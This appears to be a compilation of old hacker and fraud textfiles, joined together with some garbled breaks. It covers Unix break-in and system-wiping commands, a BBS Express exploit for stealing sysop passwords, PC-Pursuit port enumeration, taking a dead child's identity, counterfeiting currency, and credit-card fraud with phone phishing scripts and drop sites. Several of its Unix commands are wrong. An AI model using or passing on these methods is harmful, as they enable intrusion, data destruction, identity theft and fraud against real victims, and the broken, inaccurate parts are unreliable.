screwing someone's brains out.  So we can write a program to send at the
vax this type of a message:
A screen freeze (Cntrl-s), screen clear (system dependant), about 255
garbage characters, and then a command to create a login acct., after which
you clear the screen again, then unfreeze the terminal.  What this does:
When the terminal is frozen, it keeps a buffer of what is sent.  well, the
buffer is about 127 characters long. so you overflow it with trash, and then
you send a command line to create an acct. (System dependant).  after this
you clear the buffer and screen again, then unfreeze the terminal.  This is
a bad way to do it, and it is much nicer if you just send a command to
the terminal to shut the system down, or whatever you are after...
There is always, *Always* an acct. called root, the most powerful acct.
to be on, since it has all of the system files on it.  If you hack your
way onto this one, then everything is easy from here on...
On the unix system, the abort key is the Cntrl-d key.  watch how many times
you hit this, since it is also a way to log off the system!
A little about unix architechture: The root directory, called root, is
where the system resides.  After this come a few 'sub' root directories,
usually to group things (stats here, priv stuff here, the user log here...).
Under this comes the superuser (the operator of the system), and then
finally the normal users.  In the unix 'Shell' everything is treated the same.
By this we mean:  You can access a program the same way you access a user
directory, and so on.  The way the unix system was written, everything,
users included, are just programs belonging to the root directory.  Those
of you who hacked onto the root, smile, since you can screw everything...
the main level (exec level) prompt on the unix system is the $, and if you
are on the root, you have a # (superuser prompt).
Ok, a few basics for the system... To see where you are, and what paths
are active in regards to your user account, then type
=> pwd
This shows your acct. seperated by a slash with another pathname (acct.),
possibly many times. To connect through to another path,
or many paths, you would type:
You=> path1/path2/path3
and then you are connected all the way from path1 to path3.  You can
run the programs on all the paths you are connected to.  If it does
not allow you to connect to a path, then you have insufficient privs, or
the path is closed and archived onto tape.  You can run programs this way
also:
you=> path1/path2/path3/program-name
Unix treats everything as a program, and thus there a few commands to
learn...
To see what you have access to in the end path, type=>
ls
for list.  this show the programs you can run.  You can connect to
the root directory and run it's programs with=>
/root
By the way, most unix systems have their log file on the root, so you
can set up a watch on the file, waiting for people to log in and snatch their
password as it passes thru the file. To connect to a directory, use the
command:
=> cd pathname  This allows you to do what you want
with that directory.  You may be asked for a password, but this is a good
ay of finding other user names to hack onto.
The wildcard character in unix, if you want to search down a path for
a game or such, is the *.
=> ls /*
Should show you what you can access. The file types are the same as they
are on a dec, so refer to that section when examining file.  To see what is
in a file, use the
=> pr
filename command, for print file.
We advise playing with pathnames to get the hang of the concept.  There
is on-line help available on most systems with a 'help' or a '?'.
We advise you look thru the help files and pay attention to anything
they give you on pathnames, or the commands for the system.
You can, as a user, create or destroy directories on the tree beneath you.
This means that root can kill everything but root, and you can kill any
that are below you.  These are the
=> mkdir pathname
=> rmdir pathname
commands.
Once again, you are not alone on the system... type=> 
who
to see what other users are logged in to the system at the time.  If you
want to talk to them=>
write username 
Will allow you to chat at the same time, without having to worry
about the parser.  To send mail to a user, say
=> mail
And enter the mail sub-system. To send a message to all the users
on the system, say
=> wall
Which stands for 'write all'. By the way, on a few systems,
all you have to do is hit the <return> key to end the message,
but on others you must hit the cntrl-d key.
To send a single message to a user, say
=> write username
this is very handy again!  If you send the sequence of characters discussed
at the very beginning of this article, you can have the super-user terminal do
tricks for you again. 

Privs:
If you want superuser privs, you can either log in as root, or edit your
acct. so it can say
=> su
this now gives you the # prompt, and allows you to completely by-pass the
protection.  The wonderful security conscious developers at bell made it
very difficult to do much without privs, but once you have them, there
is absolutely nothing stopping you from doing anything you want to.
To bring down a unix system:
=> chdir /bin
=> rm *
this wipes out the pathname bin, where all the system maintenance files are.
Or try:
=> r -r
This recursively removes everything from the system except the remove
command itself.
Or try:
=> kill -1,1
=> sync
This wipes out the system devices from operation.
When you are finally sick and tired from hacking on the vax systems, just
hit your cntrl-d and repeat key, and you will eventually be logged out.
_______________________________________
The reason this file seems to be very sketchy is the fact that bell has 7
licenced versions of unix out in the public domain, and these commands are
those common to all of them.  I recommend you hack onto the root or
bin directory, since they have the highest levels of privs, and there
is really not much you can do (except develop software) without them.

Breaking into BBS Express              Courtesy of the Jolly Roger

If you have high enough access on any BBS Express BBS you can get the
Sysop's password without any problems and be able to log on as him and do
whatever you like. Download the Pass file, delete the whole BBS, anything.
Its all a matter of uploading a text file and d/ling it from the BBS. You
must have high enough access to see new uploads to do this. If you can see
a file you just uploaded you have the ability to break into the BBS in a
few easy steps.
Why am I telling everyone this when I run BBS Express myself?
Well there is one way to stop this from happening and I want other Sysops
to be aware of it and not have it happen to them.
Breaking in is all based on the MENU function of BBS Express. Express
will let you create a menu to display different text files by putting the
word MENU at the top of any text file and stating what files are to be
displayed. But due to a major screw up by Mr. Ledbetter you can use this
MENU option to display the USERLOG and the Sysop's Passwords or anything
else you like. I will show you how to get the Sysop's pass and therefore
log on as the Sysop. BBs Express Sysop's have 2 passwords. One like
everyone else gets in the form of X1XXX, and a Secondary password
to make it harder to hack out the Sysops pass.
The Secondary pass is found in a file called SYSDATA.DAT.
This file must be on drive 1 and is therefore easy to get. All you have to
do is upload this simple Text file:

MENU
1
D1:SYSDATA.DAT

Ripoff time!

after you upload this file you d/l it non-Xmodem. Stupid Express thinks
it is displaying a menu and you will see this:

Ripoff time!

Selection [0]:

Just hit 1 and Express will display the SYSDATA.DAT file.OPPASS is where
the Sysop's Secondary pass will be. D1:USERLOG.DAT is where you will find
the name and Drive number of the USERLOG.DAT file. The Sysop might have
renamed this file or put it in a Subdirectory or even on a different
drive. I Will Assume he left it as D1:USERLOG.DAT. The other parts of this
file tell you where the .HLP screens are and where the LOG is saved and
all the Download path names.

Now to get the Sysop's primary pass you upload a text file like this:

MENU
1
D1:USERLOG.DAT

Breaking into Bedwetter's BBS

Again you then d/l this file non-Xmodem and you will see:

Breaking into Bedwetter's BBS

Selection [0]:

You then hit 1 and the long USERLOG.DAT file comes flying at you.
The Sysop is the first entry in this very long file so it is easy. You will
see:

SYSOP'S NAME        X1XXX
You should now have his 2 passwords.

There is only one easy way out of this that I can think of, and that is
to make all new uploads go to SYSOP level (Level 9) access only. This way
nobody can pull off what I just explained.
I feel this is a major Bug on Mr. Ledbetter's part. I just don't know why
no one had thought of it before. I would like to give credit to 
Redline for the message he left on Modem Hell telling about this problem,
and also to Unka for his ideas and input about correcting it.

         Subject:    PC-Pursuit Port Statistic's 
         Date:       06/29/89 
         Written by: PC-Pursuit Users 
         ============================================================ 
         Introduction: 
         ============= 
              The last 30 days of PC-Pursuit have been extremely 
         controversial.  Users and ex-users have demanded accurate 
         statistics, and Telenet has provided us with very little. 
         And the data that was provided is questionable.  Well, here 
         is some data that is guaranteed to be accurate and make 
         Telenet scream. If you wish to update this data on your own, 
         we will tell you how later in this text. 
              The following chart consists of all the direct Telenet 
         addresses of the PC-Pursuit city nodes and the total number 
         of modems on each node.  Here is what the data means: 
         NJNEW/3 2011    .12    56 
         !     ! !        !      \-- Total Number of Modems in NJNEW 
         !     ! !        \- Last Working Suffix of Address sequence. 
         !     ! \- Direct Telenet Address Prefix. 
         !     \--- Baud Rate of This Port is 300. 
         \--------- Mnemonic. 
         Please note that there are several perfectly legal ways to 
         connect to a PC-Pursuit port such as NJNEW/3: 
              Ways To Connect to NJNEW/3: 
                   1)   C D/NJNEW/3,PCP10000,<password>   [HUNT] 
                   2)   C 2011,PCP10000,<password>        [HUNT] 
                   3)   C 2011.10,PCP10000,<password>     [NON HUNT] 
         The first, is self explanatory.  The second does the same 
         thing as the first, only that it is slightly faster and gives 
         the user much greater flexibility.  The third is an example 
         the flexibility, because a request is made to connect to the 
         tenth, and only the tenth, modem on the NJNEW/3 port. 
              By simply attempting to connect to every single modem 
         in the 2011 chain, we were able to count the number of modems 
         on each port and come up with the following charts which were
         extracted on June the twenty ninth of the year 1989: 
         Rotary   Direct  Max.  City     Rotary   Direct  Max.  City

         I think the statistics basically speak for themselves. 
         I am sure there will no doubt be hundreds of people who will 
         not smile at the number of specific kinds of ports supported, 
         not to mention the number of 'dead' or 'down' modems you will 
         find when you verify the totals.  Usually, 2% to perhaps 10% 
         of the modems are 'dead' with specific ones repeatedly 
         failing week after week. 
         History Of This Collection: 
         =========================== 
              Almost a year ago a small selected group of devoted 
         individuals got together to discuss problems with the PC- 
         Pursuit Network, in the middle of our discussions a question 
         was asked as to how the network really processes our calls. 
         This was intended to help us assess SET? commands and other 
         such matters.  When the address hypothesis was offered we 
         quickly set out to prove it.  It was proved in about 3 
         minutes with the discovery of 2011 (First try was xxx1).  The 
         data has continually been collected and analyzed ever since, 
         but until now, has never been mass released. 
              A small group of teen age hackers discovered several 
         interesting things that can be done with these addresses-- 
         many of which will not be discussed here short of mentioning 
         that these ports connected to via these addresses are not 
         limited to PC-Pursuiters.  You can, however, fight "dead" 
         dialout modems in cities via the address method.  Dead modems 
         can be located in about 10 seconds (faster than Telenet), and 
         can either be reported or skipped past by the user connecting 
         to the next modem in the sequence after the "dead" one. 
         (Note: Say 2011.3 is dead, connect to 2011.4 and you will be 
         past it.  If 2011.4 is busy, go to 2011.5.  The reader should 
         notice 2011.3 is the same as 2011C.) 
              The most interesting value of these addresses is that 
         one can count the number of ports that Telenet keeps so 
         secret (Grin).  When there were only 28 cities in operation 
         there were an average of 2.7 300 baud, 9.4 1200 baud, and 2.5 
         2400 baud modems in each city.  Some cities had as little as 
         2 modems on a port and as many as 12.  Only recently has the 
         number of modems per city begun to jump. 
         How To Update The Count Yourself: 
         ================================= 
              An ID is not required to "request" one of these ports, 
         thus the tallying can be done any time of day by simply 
         typing the number at the @ prompt.  Here is an example with 
         four modems (NJNEW/24): 
         @20122.1 
         201 22A REFUSED COLLECT CONNECTION 19 80 
         @20122.2 
         201 22B REFUSED COLLECT CONNECTION 19 80 
         @20122.3 
         201 22C REFUSED COLLECT CONNECTION 19 80 
         @20122.4 
         201 22D REFUSED COLLECT CONNECTION 19 80 
         @20122.5 
         201 22E ILLEGAL ADDRESS 19 80 
         The reader should be aware that PC-Pursuit ports always 
         respond with '19 80'.  Do not confuse it with '19 00', which 
         are not PC-Pursuit ports.  In the above example we know there 
         are four ports because the forth was the last existing port 
         before we encountered the 'ILLEGAL ADDRESS.'  There are 
         several ways to signify that you have gone one beyond the end 
         of the ports: 
            1)  xxx xxx ILLEGAL ADDRESS 19 80 
            2)  xxx xxx NOT OPERATING 19 80 
            3)  The request freezes (Note: Issue a BREAK then D <C/R> 
                to abort the attempt yielding 'ATTEMPT ABORTED'.) 
         You should be aware that modems which are out of order in the
         middle of the sequence can respond with 'NOT OPERATING' or 
         may freeze the request.  You should also note that when 
         updating the existing list, all you need to do is try to 
         request the next modem beyond the end as of the last check. 
         Finding Newly Added Ports: 
         ========================== 
              Many ports have not yet been installed; hence, we do not 
         yet know the addresses.  New ports may be found by entering 
         the first three digits of the area code and appending (1-29, 
         101-129, 201-229, 301-329, etc.) until the 'REFUSED COLLECT 
         CONNECTION 19 80' appears.  Once this is found, simply log 
         onto the port address with your ID and R/V dial some silly 
         series of digits, disconnect the port, then connect to the 
         PC-Pursuit mnemonic you think it might be and R/V redial the 
         last number.  If the numbers match, you found it.How To Create A New Indentity                    By The Walking Glitch

You might be saying, "Hey Glitch, what do I need a new identity for?"
The answer is simple. You might want to go buy liquor somewhere, right?
You might want to go give the cops the false name when you get busted
so you keep your good name, eh?  You might even want to use the new
identity for getting a P.O. Box for carding. Sure! You might even
want the stuff for renting yourself a VCR at some dickless loser of a
convenience store. Here we go:
Getting a new ID isn't always easy, no one said it would be. By following
these steps, any bozo can become a new bozo in a coupla weeks.

STEP 1

The first step is to find out who exactly you'll become. The
most secure way is to use someone's ID who doesn't use it themselves.
The people who fit that bill the best are dead. As an added bonus they
don't go complaining one bit. Go to the library and look
through old death notices. You have to find someone who was born about
the same time as you were, or better yet, a year or two older
so you can buy booze, etc. You should go back as far as you can for the
death because most states now cross index deaths to births so people
can't do this in the future. The cutoff date in Wisconsin is 1979, folks
in this grand state gotta look in 1978 or earlier. Anything earier there
is cool. Now, this is the hardest part if you're younger. Brats that
young happen to be quite resilient, takin' falls out of three story windows
and eating rat poison like its Easter candy, and not a scratch or
dent. There ain't many that die, so ya gotta look your ass off. Go
down to the library and look up all the death notices you can,
if it's on microfilm so much the better. You might have to go through
months of death notices though, but the results are well worth it.
You gotta get someone who died locally in most instances: the death
certificate is filed only in the county of death. Now you go down to
the county courthouse in the county where he died and get the
death certificate, this will cost you around $3-$5 depending on the state
you're in. Look at this hunk of paper, it could be your way to
vanish in a clould of smoke when the right time comes, like right after
that big scam. If You're lucky, the slobs parents signed him up with
social security when he was a snot nosed brat. That'll be another piece
of ID you can get. If not, thats ok too. It'll be listed on the death
certificate if he has one. If you're lucky, the stiff was born
locally and you can get his birth certificate right away.

STEP 2

Now check the place of birth on the death certificate, if it's in
the same place you standing now you're all set. If not, you can mail
away for one from that county but its a minor pain and it might 
take a while to get, the librarian at the desk has listings of where
to write for this stuff and exactly how much it costs. Get the Birth
cirtificate, its worth the extra money to get it certified
because thats the only way some people will accept it for ID. When yur
gettin this stuff the little forms ask for the reason you want it,
instead of writing in "Fuck you", try putting in the word "Geneology".
They get this all the time.  If the Death certificate looks good for
you, wait a day or so before getting the certified birth certificate
in case they recognize someone wanting it for a dead guy.

STEP 3

Now your cookin! You got your start and the next part's easy.
Crank out your old Dot matrix printer and run off some mailing labels
addressed to you at some phony address. Take the time to check your
phony address that there is such a place. Hotels that rent by the month
or large apartment buildings are good, be sure to get the right zip
code for the area. These are things that the cops might notice that
will trip you up.  Grab some old junk mail and paste your new lables
on them. Now take them along with the birth certificate down to the library.
Get a new library card. If they ask you if you had one before say that
you really aren't sure because your family moved around alot when
you were a kid. Most libraries will allow you to use letters as a form
of ID when you get your card. If they want more give them a sob story
about how you were mugged and got your wallet stolen with all your
identification. Your card should be waiting for you in about two weeks.
Most libraries ask for two forms of ID, one can be your trusty Birth
Certificate, and they do allow letters addressed to you as a second
form.

STEP 4
    
Now you got a start, it isn't perfect yet, so let's continue. You should
have two forms of ID now. Throw away the old letters, or better yet
stuff them inside the wallet you intend to use with this stuff.
Go to the county courthouse and show them what nice ID you got and get
a state ID card. Now you got a picture ID. This will take about two weeks
and cost about $5, its well worth it.

STEP 5

If the death certificate had a social security number on it you can go
out and buy one of those metal SS# cards that they sell.
If it didn't, then you got all kinds of pretty ID that shows exactly
who you are. If you don't yet have an SS#, Go down and apply for one,
these are free but they could take five or six weeks to get,
Bureaucrats you know... You can invent a SS# too if ya like, but the motto
of 'THE WALKING GLITCH' has always been "Why not excellence?".

STEP 6

If you want to go whole hog you can now get a bank account in your new
name.  If you plan to do alot of traveling then you can put alot
of money in the account and then say you lost the account book.  After 
you get the new book you take out all the cash. They'll hit you
with a slight charge and maybe tie-up your money some, but if you're
ever broke in some small town that bank book will keep you from being
thrown in jail as a vagrant.

ALL DONE?

So kiddies, you got ID for buying booze, but what else? In some towns
(the larger the more likely) the cops if they catch you for something
petty like shoplifting stuff under a certain dollar amount, will just
give you a ticket, same thing for pissing in the street. Thats it!
No fingerprints or nothing, just pay the fine (almost always over $100)
or appear in court.  Of course they run a radio check on your ID, you'll
be clean and your alter-ego gets a blot on his record.
Your free and clear.  Thats worth the price of the trouble you've gone
through right there.  If your smart, you'll toss that ID away if this
happens, or better yet, tear off your picture and give the ID to someone
you don't like, maybe they'll get busted with it.
If you're a working stiff, here's a way to stretch your dollar. Go to work
for as long as it takes to get unemployment and then get yourself fired.
Go to work under the other name while your getting the unemployment.
With a couple of sets of ID, you can live like a king.  These concepts
for survival in the new age come to you compliments of THE WALKING GLITCH.

Counterfeiting Money                            by JRoger

Before reading this article, it would be a very good idea to get a 
book on photo offset printing, for this is the method used in
counterfeiting US currency.  If you are familiar with this method 
of printing, counterfeiting should be a simple task for you.

Genuine currency is made by a process called "gravure", which 
involves etching a metal block.  Since etching a metal block is
impossible to do by hand, photo offset printing comes into the 
process.

Photo offset printing starts by making negatives of the currency
with a camera, and putting the negatives on a piece of masking 
material (usually orange in color).  The stripped negatives, 
commonly called "flats", are then exposed to a lithographic plate
with an arc light plate maker.  The burned plates are then 
developed with the proper developing chemical.  One at a time, 
these plates are wrapped around the plate cylinder of the press.   

The press to use should be an 11 by 14 offset, such as the AB Dick 
360.  Make 2 negatives of the portrait side of the bill, and 1 of 
the back side.  After developing them and letting them dry, take 
them to a light table.  Using opaque on one of the portrait sides, 
touch out all the green, which is the seal and the serial numbers.  
The back side does not require any retouching, because it is all 
one color.  Now, make sure all of the negatives are registered 
(lined up correctly) on the flats.  By the way, every time you 
need another serial number, shoot 1 negative of the portrait side,
cut out the serial number, and remove the old serial number from 
the flat replacing it with the new one.

Now you have all 3 flats, and each represents a different color:  
black, and 2 shades of green (the two shades of green are created 
by mixing inks).  Now you are ready to burn the plates.  Take a 
lithographic plate and etch three marks on it.  These marks must 
be 2 and 9/16 inches apart, starting on one of the short edges.  
Do the same thing to 2 more plates.  Then, take 1 of the flats and 
place it on the plate, exactly lining the short edge up with the 
edge of the plate.  Burn it, move it up to the next mark, and 
cover up the exposed area you have already burned.  Burn that, and 
do the same thing 2 more times, moving the flat up one more mark.  
Do the same process with the other 2 flats (each on a separate 
plate).  Develop all three plates.  You should now have 4 images 
on each plate with an equal space between each bill. 

The paper you will need will not match exactly, but it will do for 
most situations.  The paper to use should have a 25% rag content.
By the way, Disaperf computer paper (invisible perforation) does 
the job well.  Take the paper and load it into the press.  Be sure 
to set the air, buckle, and paper thickness right.  Start with the 
black plate (the plate without the serial numbers).  Wrap it 
around the cylinder and load black ink in.  Make sure you run more 
than you need because there will be a lot of rejects.  Then, while 
that is printing, mix the inks for the serial numbers and the back 
side.  You will need to add some white and maybe yellow to the 
serial number ink.  You also need to add black to the back side.  
Experiment until you get it right.  Now, clean the press and print 
the other side.  You will now have a bill with no green seal or 
serial numbers.  Print a few with one serial number, make another 
and repeat.  Keep doing this until you have as many different 
numbers as you want.  Then cut the bills to the exact size with a 
paper cutter.  You should have printed a large amount of money by 
now, but there is still one problem;  the paper is pure white.  To 
dye it, mix the following in a pan:  2 cups of hot water, 4 tea 
bags, and about 16 to 20 drops of green food coloring (experiment 
with this).  Dip one of the bills in and compare it to a genuine 
US bill.  Make the necessary adjustments, and dye all the bills.  
Also, it is a good idea to make them look used.  For example, 
wrinkle them, rub coffee grinds on them, etc.

As before mentioned, unless you are familiar with photo offset 
printing, most of the information in this article will be fairly 
hard to understand.  Along with getting a book on photo offset 
printing, try to see the movie "To Live and Die in LA".  It is 
about a counterfeiter, and the producer does a pretty good job of 
showing how to counterfeit.  A good book on the subject is "The 
Poor Man's James Bond".

If all of this seems too complicated to you, there is one other 
method available for counterfeiting:  The Canon color laser 
copier.  The Canon can replicate ANYTHING in vibrant color, 
including US currency.  But, once again, the main problem in 
counterfeiting is the paper used.  So, experiment, and good luck!

-----------------

For most of you out there, money is hard to come by.  Until now:

With the recent advent of plastic money (credit cards), it is 
easy to use someone else's credit card to order the items you have 
always desired in life.  The stakes are high, but the payoff is 
worth it.

Step One:  Getting the credit card information

First off, you must obtain the crucial item:  someone's credit 
card number.  The best way to get credit card numbers is to take 
the blue carbons used in a credit card transaction at your local 
department store.  These can usually be found in the garbage can 
next to the register, or for the more daring, in the garbage 
dumpster behind the store.  But, due to the large amount of credit 
card fraud, many stores have opted to use a carbonless transaction 
sheet, making things much more difficult.  This is where your 
phone comes in handy.

First, look up someone in the phone book, and obtain as much 
information as possible about them.  Then, during business hours, 
call in a very convincing voice - "Hello, this is John Doe from 
the Visa Credit Card Fraud Investigations Department.  We have 
been informed that your credit card may have been used for 
fraudulent purposes, so will you please read off the numbers 
appearing on your Visa card for verification."  Of course, use 
your imagination!  Believe it or not, many people will fall for 
this ploy and give out their credit information.

Now, assuming that you have your victim's credit card number, you 
should be able to decipher the information given.

Step Two:  Recognizing information from carbon copies

Card examples:

[American Express]
XXXX XXXXXX XXXXX
MM/Y1 THRU MM/Y2
JOE SHMOE

[American Express]
XXXX XXXXXX XXXXX
MM/Y1 THRU MM/Y2
JOE SHMOE

Explanation:
   MM/Y1 is the date the card was issued, and MM/Y2 is the
   expiration date.  The American Express Gold Card has numbers
   XXXXXX XXXXXXXX XXXXXXXX, and is covered for up to $5000.00, 
   even if the card holder is broke. 
   
[Mastercard]
5XXX XXXX XXXX XXXX
XXXX AAA DD-MM-YY MM/YY
JOE SHMOE

Explanation:
   XXXX in the second row may be asked for during the ordering
   process.  The first date is when the card was new, and the 
   second is when the card expires.  The most frequent number 
   combination used is 5424 1800 XXXX XXXX.  There are many of 
   these cards in circulation, but many of these are on wanted
   lists, so check these first.

[Visa]
4XXX XXX(X) XXX(X) XXX(X)
MM/YY    MM/YY*VISA
JOE SHMOE

Explanation:
   Visa is the most abundant card, and is accepted almost 
   everywhere.  The "*VISA" is sometimes replaced with "BWG", or
   followed with a special code.  These codes are as follows:

   [1]  MM/YY*VISA V - Preferred Card
   [2]  MM/YY*VISA CV - Classic Card
   [3]  MM/YY*VISA PV - Premier Card
   
   Preferred Cards are backed with money, and are much safer to 
   use.  Classic Cards are newer, harder to reproduce cards with
   decent backing.  Premier Cards are Classic Cards with Preferred
   coverage.  Common numbers are 4448 020 XXX XXX, 4254 5123 6000
   XXXX, and 4254 5123 8500 XXXX.  Any 4712 1250 XXXX XXXX cards
   are IBM Credit Union cards, and are risky to use, although 
   they are usually covered for large purchases.

Step Three:  Testing credit

You should now have a Visa, Mastercard, or American Express 
credit card number, with the victim's address, zip code, and phone 
number.  By the way, if you have problems getting the address, 
most phone companies offer the Address Tracking Service, which is 
a special number you call that will give you an address from a 
phone number, at a nominal charge.  Now you need to check the 
balance of credit on the credit card (to make sure you don't run 
out of money), and you must also make sure that the card isn't 
stolen.  To do this you must obtain a phone number that 
businesses use to check out credit cards during purchases.  If you 
go to a department store, watch the cashier when someone makes a 
credit card purchase.  He/she will usually call a phone number, 
give the credit information, and then give what is called a 
"Merchant Number".  These numbers are usually written down on or 
around the register.  It is easy to either find these numbers and 
copy them, or to wait until they call one in.  Watch what they 
dial and wait for the 8 digit (usually) merchant number.  Once you 
call the number, in a calm voice, read off the account number, 
merchant number, amount, and expiration date.  The credit bureau 
will tell you if it is ok, and will give you an authorization 
number.  Pretend you are writing this number down, and repeat it 
back to them to check it.  Ignore this number completely, for it 
serves no real purpose.  However, once you do this, the bank 
removes dollars equal to what you told them, because the card was 
supposedly used to make a purchase.  Sometimes you can trick the
operator by telling her the customer changed his mind and decided 
not to charge it.  Of course, some will not allow this.  Remember
at all times that you are supposed to be a store clerk calling to 
check out the card for a purchase.  Act like you are talking with 
a customer when he/she "cancels".

Step Four:  The drop

Once the cards are cleared, you must find a place to have the 
package sent.  NEVER use a drop more than once.  The following are 
typical drop sites:

   [1]  An empty house
        
An empty house makes an excellent place to send things.  Send the 
package UPS, and leave a note on the door saying, "UPS.  I work 
days, 8 to 6.  Could you please leave the package on the back door 
step?"  You can find dozens of houses from a real estate agent by 
telling them you want to look around for a house.  Ask for a list 
of twenty houses for sale, and tell them you will check out the 
area.  Do so, until you find one that suits your needs.

   [2]  Rent A Spot

U-Haul sometimes rents spaces where you can have packages sent and 
signed for.  End your space when the package arrives.

   [3]  People's houses

Find someone you do not know, and have the package sent there.  
Call ahead saying that "I called the store and they sent the 
package to the wrong address.  It was already sent, but can you 
keep it there for me?"  This is a very reliable way if you keep
calm when talking to the people.

Do NOT try post office boxes.  Most of the time, UPS will not 
deliver to a post office box, and many people have been caught in 
the past attempting to use a post office box.  Also, when you have 
determined a drop site, keep an eye on it for suspicious 
characters and cars that have not been there before.

Step Five:  Making the transaction

You should now have a reliable credit card number with all the 
necessary billing information, and a good drop site.

The best place to order from is catalogues, and mail order houses.  
It is in your best interest to place the phone call from a pay 
phone, especially if it is a 1-800 number.  Now, when you call, 
don't try to disguise your voice, thinking you will trick the 
salesperson into believing you are an adult.  These folks are 
trained to detect this, so your best bet is to order in your own 
voice.  They will ask for the following:  name, name as it appears 
on card, phone number, billing address, expiration date, method of 
shipping, and product.  Ask if they offer UPS Red shipping (next 
day arrival), because it gives them less time to research an 
order.  If you are using American Express, you might have a bit of 
a problem shipping to an address other than the billing address.  
Also, if the salesperson starts to ask questions, do NOT hang up.  
Simply talk your way out of the situation, so you won't encourage
investigation on the order.

If everything goes right, you should have the product, free of 
charge.  Insurance picks up the tab, and no one is any wiser.  Be 
careful, and try not to order anything over $500.  In some states, 
UPS requires a signature for anything over $200, not to mention 
that anything over $200 is defined as grand theft, as well as 
credit fraud.  Get caught doing this, and you will bite it for a 
couple of years.  Good luck!

Obtaining a credit card number: There are many ways to obtain the
information needed to card something.
The most important things needed are the card number and the expiration
date.  Having the card-holders name doesn't hurt, but it is not essential.
The absolute best way to obtain all the information needed is by trashing.
The way this is done is simple.  You walk around your area or any other
area and find a store, mall, supermarket, etc., that throws their
garbage outside on the sidewalk or dumpster.  Rip the bag open and see
if you can find any carbons at all.  If you find little shreds of
credit card carbons, then it is most likely not worth your time to tape
together.  Find a store that does not rip their carbons at all or only in half.
Another way is to bullshit the number out of someone.  That is call them
up and say "Hello, this is Visa security and we have a report that
your card was stolen." They will deny it and you will try to get it out
of them from that point on.  You could say, "It wasn't stolen?  Well what
is the expiration date and maybe we can fix the problem....
Ok and what is the number on your card?......Thank you very much and
have a nice day."  Or think of something to that degree. 
Another way to get card numbers is through systems such as TRW and CBI,
this is the hard way, and probably not worth the trouble, unless you are
an expert on the system.  Using credit card numbers posted on BBS's is
risky.  The only advantage is that there is a good chance that other
people will use it, thus decreasing the chances of being the
sole-offender.  The last method of getting numbers is very good also.
In most video rental stores, they take down your credit card number
when you join to back-up your rentals.  So if you could manage to steal
the list or make a copy of it, then you are set for a LONG time.
Choosing a victim: Once you have the card number, it is time to make the
order.  The type of places that are easiest to victimize are small
businesses that do mail order or even local stores that deliver.
If you have an ad for a place with something you want and the order number
is NOT a 1-800 number then chances are better that you will succeed.
Ordering: When you call the place up to make the order, you must have
several things readily at hand.  
These are the things you will need: A name, telephone number, business
phone, card number (4 digit bank code if the card is MasterCard),
expiration date, and a complete shipping and billing address.
I will talk about all of these in detail.  A personal tip: When I call
to make an order, it usually goes much smoother if the person you are
talking to is a woman.  In many cases they are more gullible than men.
The name:  You could use the name on the card or the name of the person
who you are going to send the merchandise to.  Or you could use the name
on the card and have it shipped to the person who lives at the drop
(Say it is a gift or something). 
The name is really not that important because when the company verifies
the card, the persons name is never mentioned, EXCEPT when you have a
Preffered Visa card.  Then the name is mentioned.  You can tell if you
have a Preffered Visa card by the PV to the right of the expiration
date on the carbon. Nophone all day long waiting for the company to call
(Which they will), then the phone number to give them as your home-phone
could be one of the following: A number that is ALWAYS busy, a number
that ALWAYS rings, a payphone number, low end of a loop (and you will wait
on the other end), or a popular BBS.
NEVER give them your home phone because they will find out as soon as
the investigation starts who the phone belongs to.  The best thing would
be to have a payphone call forward your house
(via Cosm The business number:  When asked for, repeat the number you
used for your home phone.
Card number: The cards you will use will be Visa, Mastercard, and
American Express.  The best is by far Visa.  It is the most
straight-forward.  Mastercard is pretty cool except for the bank code.
When they ask for the bank code, they sometimes also ask for the bank
that issued it.  When they ask that just say the biggest bank you know of
in your area.  Try to avoid American Express.  They tend to lead full
scale investigations.  Unfortunately, American Express is the most popular
card out.   When telling the person who is taking your call the card
number, say it slow, clear, and with confidence.
e.g. CC# is 5217-1234-5678-9012.  Pause after each set of four so you
don't have to repeat it.
Expiration date: The date must be at LEAST in that month.  It is best
to with more than three months to go.
The address: More commonly referred to as the 'drop'.  Well the drop
can range from an abandoned building to your next door neighbors
apartment.  If you plan to send it to an apartment building then be
sure NOT to include an apartment number.  This will confuse UPS or postage
men a little and they will leave the package in the lobby. 
Here is a list of various drops: The house next door whose family is on
vacation, the apartment that was just moved out of, the old church that
will be knocked down in six months, your friends house who has absolutely
nothing to do with the type of merchandise you will buy and who will
also not crack under heat from feds, etc..
There are also services that hold merchandise for you, but personally
I would not trust them.  And forget about P.O. Boxes because you need
ID to get one and most places don't ship to them anyway.
Other aspects of carding:Verifying cards, seeing if they were reported
stolen.
Verifying cards: Stores need to verify credit cards when someone purchases
something with one.  They call up a service that checks to see if the
customer has the money in the bank.
The merchant identifies himself with a merchant number.  The service
then holds the money that the merchant verified on reserve.  When the
merchant sends in the credit card form, the service sends the merchant
the money.  The service holds the money for three days and if no form
appears then it is put back into the bank.  The point is that if you
want to verify something then you should verify it for a little amount
and odds are that there will be more in the bank.
The good thing about verification is that if the card doesn't exist or
if it is stolen then the service will tell you.  To verify MasterCard
and Visa try this number.  It is voice:1-800-327-1111 merchant code is
596719.
Stolen cards: Mastercard and Visa come out with a small catalog every
week where they publish EVERY stolen or fraudulantly used card.
I get this every week by trashing the same place on the same day. 
If you ever find it trashing then try to get it every week.
Identifying cards: Visa card numbers begin with a 4 and have either 13
or 16 digits.  MasterCard card numbers begin with a 5 and have 16 digits.
American Express begins with a 3 and has 15 digits.  They all have the
formats of the following:
3xxx-xxxxxx-xxxxx   American Express
4xxx-xxx-xxx-xxx    Visa
4xxx-xxxx-xxxx-xxxx Visa
5xxx-xxxx-xxxx-xxxx MasterCard
Gold cards: A gold card simply means that credit is good for $5000. 
Without a gold card, credit would be normally $2000. 
To recognize a gold card on a carbon there are several techniques:
American Express-none.
Visa-PV instead of CV.
Note-When verifying a PV Visa, you have to have the real name of the
cardholder.
Mastercard-An asterix can signify a gold card, but this changes depending
when the card was issued.
I am going to type out a dialog between a carder and the phone operator
to help you get the idea.
Operator: "Over-priced Computer Goods, may I help you?"
Carder:   "Hi, I would like to place an order please."
Operator: "Sure, what would you like to order?"
Carder:   "400 generic disks and a double density drive."
Operator: "Ok, is there anything else?"
Carder:   "No thank you, that's all for today."
Operator: "Ok, how would you like to pay for this?  MasterCard or Visa?"
Carder:   "Visa."
Operator: "And your name is?"
Carder:   "Lenny Lipshitz." (Name on card)
Operator: "And your Visa card number is?"
Carder:   "4240-419-001-340" (Invalid card)
Operator: "Expiration date?"
Carder:   "06-92."
Operator: "And where would you like the package shipped to?"
